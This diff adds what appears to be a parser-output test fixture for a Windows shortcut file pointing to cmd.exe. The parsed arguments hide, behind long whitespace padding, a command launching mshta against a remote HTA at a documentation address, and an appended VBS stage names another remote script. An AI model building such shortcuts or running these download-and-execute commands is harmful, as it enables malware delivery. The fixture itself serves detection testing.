@@ -1,0 +1,138 @@
+{
+ "appended": {
+  "encoding": "utf-8",
+  "head_hex": "2720617070656e646564207374616765",
+  "kind": "vbs",
+  "md5": "75d60a65a59ced583c209846ec1529d3",
+  "offset": 1131,
+  "sha1": "22ddef413a5dcdd10e69de5baeb1b41797c90ed3",
+  "sha256": "926bc6e7feed9480c95bc4570d21fa06983ba5e15e78c548d92cbca255e0a0b0",
+  "size": 84,
+  "text": "' appended stage (fixture, strings only)\r\nDim u : u = \"https://203.0.113.12/a.vbs\"\r\n",
+  "text_truncated": false
+ },
+ "error": null,
+ "kind": "lnk",
+ "lnk": {
+  "data": {
+   "command_line_arguments": "\t                                                                                                                                                                                                                                                                \r\n/c echo start /min mshta https://203.0.113.11/nfe.hta",
+   "icon_location": "%SystemRoot%\\System32\\imageres.dll",
+   "relative_path": "..\\..\\..\\Windows\\System32\\cmd.exe"
+  },
+  "extra": {
+   "DISTRIBUTED_LINK_TRACKER_BLOCK": {
+    "birth_droid_file_identifier": "25DD1000-E4C9-11F1-9235-00005E005301",
+    "birth_droid_volume_identifier": "6F1D2A3B-4C5D-4E6F-8A9B-0C1D2E3F5303",
+    "droid_file_identifier": "25DD1000-E4C9-11F1-9235-00005E005301",
+    "droid_volume_identifier": "6F1D2A3B-4C5D-4E6F-8A9B-0C1D2E3F5303",
+    "length": 88,
+    "machine_identifier": "desktop-exmpl01",
+    "size": 96,
+    "version": 0
+   },
+   "TERMINAL_BLOCK": {
+    "appended_data_sha256": "926bc6e7feed9480c95bc4570d21fa06983ba5e15e78c548d92cbca255e0a0b0",
+    "size": 88
+   }
+  },
+  "header": {
+   "accessed_time": "2026-11-18T08:30:00+00:00",
+   "creation_time": "2026-11-18T08:30:00+00:00",
+   "file_flags": [
+    "FILE_ATTRIBUTE_ARCHIVE"
+   ],
+   "file_size": 289792,
+   "guid": "00021401-0000-0000-C000-000000000046",
+   "hotkey": "UNSET - UNSET {0x0000}",
+   "icon_index": 0,
+   "link_flags": [
+    "HasTargetIDList",
+    "HasLinkInfo",
+    "HasRelativePath",
+    "HasArguments",
+    "HasIconLocation",
+    "IsUnicode"
+   ],
+   "modified_time": "2026-11-18T08:30:00+00:00",
+   "r_file_flags": 32,
+   "r_hotkey": 0,
+   "r_link_flags": 235,
+   "windowstyle": "SW_SHOWMINNOACTIVE"
+  },
+  "link_info": {
+   "common_path_suffix": "",
+   "link_info_flags": 1,
+   "local_base_path": "C:\\Windows\\System32\\cmd.exe",
+   "location": "Local",
+   "location_info": {
+    "drive_serial_number": "0x5e005303",
+    "drive_type": "DRIVE_FIXED",
+    "r_drive_type": 3,
+    "volume_label": ""
+   }
+  },
+  "size": 1215,
+  "target": {
+   "items": [
+    {
+     "class": "Root Folder",
+     "guid": "20D04FE0-3AEA-1069-A2D8-08002B30309D",
+     "sort_index": "My Computer",
+     "sort_index_value": 80
+    },
+    {
+     "class": "Volume Item",
+     "flags": "0xf",
+     "volume_name": "C:\\"
+    },
+    {
+     "class": "File entry",
+     "file_attribute_flags": 16,
+     "file_size": 0,
+     "flags": "Is directory",
+     "primary_name": "Windows"
+    },
+    {
+     "class": "File entry",
+     "file_attribute_flags": 16,
+     "file_size": 0,
+     "flags": "Is directory",
+     "primary_name": "System32"
+    },
+    {
+     "class": "File entry",
+     "file_attribute_flags": 32,
+     "file_size": 289792,
+     "flags": "Is file",
+     "primary_name": "cmd.exe"
+    }
+   ]
+  }
+ },
+ "parser": "LnkParse3 1.6.0",
+ "precheck": null,
+ "size": 1215,
+ "string_data": {
+  "end": 1031,
+  "error": null,
+  "fields": {
+   "command_line_arguments": {
+    "count": 312,
+    "nul": false,
+    "text": "\t                                                                                                                                                                                                                                                                \r\n/c echo start /min mshta https://203.0.113.11/nfe.hta"
+   },
+   "icon_location": {
+    "count": 34,
+    "nul": false,
+    "text": "%SystemRoot%\\System32\\imageres.dll"
+   },
+   "relative_path": {
+    "count": 33,
+    "nul": false,
+    "text": "..\\..\\..\\Windows\\System32\\cmd.exe"
+   }
+  }
+ },
+ "unavailable": null,
+ "warnings": []
+}
